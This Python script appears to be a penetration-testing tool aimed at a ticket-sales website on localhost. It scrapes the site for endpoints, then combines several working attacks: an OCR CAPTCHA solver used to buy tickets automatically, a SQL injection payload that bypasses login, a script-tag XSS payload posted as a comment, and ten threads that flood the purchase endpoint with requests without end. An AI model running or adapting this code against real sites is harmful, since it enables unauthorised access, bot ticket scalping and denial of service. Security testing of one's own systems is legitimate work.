import requests
from threading import Thread
from PIL import Image
import pytesseract
from io import BytesIO
from bs4 import BeautifulSoup

# Base URL for the target website
BASE_URL = "http://localhost/ticket_system"

# URLs will be dynamically discovered
CAPTCHA_URL = ""
PURCHASE_URL = ""
LOGIN_URL = ""
COMMENTS_URL = ""


def discover_endpoints():
    """Discover available endpoints dynamically."""
    global CAPTCHA_URL, PURCHASE_URL, LOGIN_URL, COMMENTS_URL

    try:
        response = requests.get(BASE_URL)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")

        # Find links or forms leading to APIs
        for link in soup.find_all("a", href=True):
            href = link["href"]
            if "captcha" in href:
                CAPTCHA_URL = f"{BASE_URL}/{href}"
            elif "purchase" in href:
                PURCHASE_URL = f"{BASE_URL}/{href}"
            elif "login" in href:
                LOGIN_URL = f"{BASE_URL}/{href}"
            elif "comments" in href:
                COMMENTS_URL = f"{BASE_URL}/{href}"

        print("Discovered Endpoints:")
        print(f"CAPTCHA_URL: {CAPTCHA_URL}")
        print(f"PURCHASE_URL: {PURCHASE_URL}")
        print(f"LOGIN_URL: {LOGIN_URL}")
        print(f"COMMENTS_URL: {COMMENTS_URL}")

    except Exception as e:
        print(f"Error discovering endpoints: {e}")


def solve_captcha():
    """Solve captcha using OCR."""
    if not CAPTCHA_URL:
        print("CAPTCHA URL not found.")
        return ""

    response = requests.get(CAPTCHA_URL)
    captcha_image = Image.open(BytesIO(response.content))
    captcha_text = pytesseract.image_to_string(captcha_image, config="--psm 6")
    print(f"Solved captcha: {captcha_text.strip()}")
    return captcha_text.strip()


def purchase_ticket(event_id, seat_number):
    """Simulate a ticket purchase."""
    if not PURCHASE_URL:
        print("Purchase URL not found.")
        return

    captcha_text = solve_captcha()
    payload = {
        "event_id": event_id,
        "seat_number": seat_number,
        "captcha": captcha_text
    }
    response = requests.post(PURCHASE_URL, json=payload)
    print(f"Purchase Response: {response.json()}")


def sql_injection_test():
    """Test for SQL Injection vulnerability."""
    if not LOGIN_URL:
        print("Login URL not found.")
        return

    payload = {"username": "' OR 1=1; --", "password": "irrelevant"}
    response = requests.post(LOGIN_URL, json=payload)
    if "success" in response.text:
        print("SQL Injection successful: Authentication bypassed!")
    else:
        print("SQL Injection test passed: No vulnerability detected.")


def flood_request():
    """Simulate HTTP flood attack."""
    if not PURCHASE_URL:
        print("Purchase URL not found.")
        return

    while True:
        try:
            response = requests.get(PURCHASE_URL)
            print(f"HTTP request sent, status code: {response.status_code}")
        except Exception as e:
            print(f"Request failed: {e}")


def xss_attack():
    """Simulate XSS attack."""
    if not COMMENTS_URL:
        print("Comments URL not found.")
        return

    payload = {"comment": "<script>alert('XSS Attack Successful');</script>"}
    response = requests.post(COMMENTS_URL, json=payload)
    if response.status_code == 200:
        print("XSS Attack successful.")
    else:
        print("XSS Attack test passed: No vulnerability detected.")


def run_comprehensive_attack():
    """Execute comprehensive penetration testing."""
    discover_endpoints()  # Discover all endpoints dynamically

    if not CAPTCHA_URL or not PURCHASE_URL or not LOGIN_URL or not COMMENTS_URL:
        print("Some required endpoints could not be discovered. Exiting.")
        return

    print("Starting ticket purchase simulation...")
    purchase_ticket(event_id=1, seat_number="A1")

    print("Starting penetration tests...")
    threads = []

    # SQL Injection test
    sql_thread = Thread(target=sql_injection_test)
    threads.append(sql_thread)

    # HTTP Flood attack
    for _ in range(10):
        flood_thread = Thread(target=flood_request)
        threads.append(flood_thread)

    # XSS Attack test
    xss_thread = Thread(target=xss_attack)
    threads.append(xss_thread)

    # Start all threads
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    run_comprehensive_attack()
